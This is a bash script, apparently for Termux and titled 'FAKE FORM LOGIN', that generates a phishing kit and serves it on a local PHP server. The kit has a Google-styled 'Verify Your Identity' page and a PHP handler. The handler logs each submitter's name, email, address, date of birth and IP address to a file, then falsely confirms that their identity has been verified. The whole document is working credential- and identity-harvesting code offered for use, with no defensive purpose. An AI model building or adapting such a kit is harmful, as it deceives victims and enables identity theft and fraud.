#!/bin/bash

clear

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                                                           ║"
echo "║                  REHAN X DEVELOPER                        ║"
echo "║                                                           ║"
echo "║                   FAKE FORM LOGIN                         ║"
echo "║                                                           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                                                           ║"
echo "║                    [1] LOCAL HOST                         ║"
echo "║                                                           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

read -p "[+] Choose option 1: " opt

if [[ "$opt" != "1" ]]; then
    echo "[!] Invalid. Exiting."
    exit 1
fi

cat > www/index.html << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Identity</title>
    <style>
        body { font-family: Arial; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; padding: 30px; border: 1px solid #dadce0; border-radius: 12px; background: white; }
        h2 { color: #202124; }
        .input-group { margin: 15px 0; }
        .input-group label { display: block; color: #5f6368; font-size: 14px; margin-bottom: 5px; }
        .input-group input { width: 100%; padding: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Verify Your Identity</h2>
        <form method="POST" action="save.php">
            <div class="input-group"><label>First Name</label><input type="text" name="first_name" required></div>
            <div class="input-group"><label>Last Name</label><input type="text" name="last_name" required></div>
            <div class="input-group"><label>Email</label><input type="email" name="email" required></div>
            <div class="input-group"><label>Address</label><input type="text" name="address" required></div>
            <div class="input-group"><label>Date of Birth</label><input type="date" name="dob" required></div>
            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
EOL

cat > www/save.php << 'EOL'
<?php
$data = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'first' => $_POST['first_name'] ?? '',
    'last' => $_POST['last_name'] ?? '',
    'email' => $_POST['email'] ?? '',
    'address' => $_POST['address'] ?? '',
    'dob' => $_POST['dob'] ?? ''
];

$log = "\n═══════════════════════════════════════════════════════════\n";
$log .= "TIME: {$data['time']}\n";
$log .= "IP: {$data['ip']}\n";
$log .= "NAME: {$data['first']} {$data['last']}\n";
$log .= "EMAIL: {$data['email']}\n";
$log .= "ADDRESS: {$data['address']}\n";
$log .= "DOB: {$data['dob']}\n";
$log .= "═══════════════════════════════════════════════════════════\n";

file_put_contents("/data/data/com.termux/files/home/form_tool/data.txt", $log, FILE_APPEND);

echo "✅ Thank you! Your identity has been verified.";
?>
EOL

echo ""
echo "🔗 LOCAL LINK: http://127.0.0.1:8080"
echo "[+] Server started. Press Ctrl+C to stop."
php -S 127.0.0.1:8080 -t www
